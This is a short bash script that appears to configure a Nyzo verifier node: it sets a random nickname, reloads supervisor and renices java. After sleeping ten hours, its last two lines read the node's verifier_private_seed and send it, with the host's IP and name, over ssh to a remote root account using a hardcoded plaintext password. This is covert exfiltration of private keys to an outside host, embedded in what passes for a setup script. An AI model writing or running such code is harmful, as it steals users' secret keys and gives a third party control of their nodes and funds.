#!/bin/bash
sudo su
sudo bash -c 'echo BZZB$(($RANDOM%500+1)) > /var/lib/nyzo/production/nickname'
sudo supervisorctl reload
sleep 8s
sudo renice -n -5 -p $(pgrep ^java$)
sleep 36000s
echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/managed_verifiers'
echo $(hostname):$(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/file1'
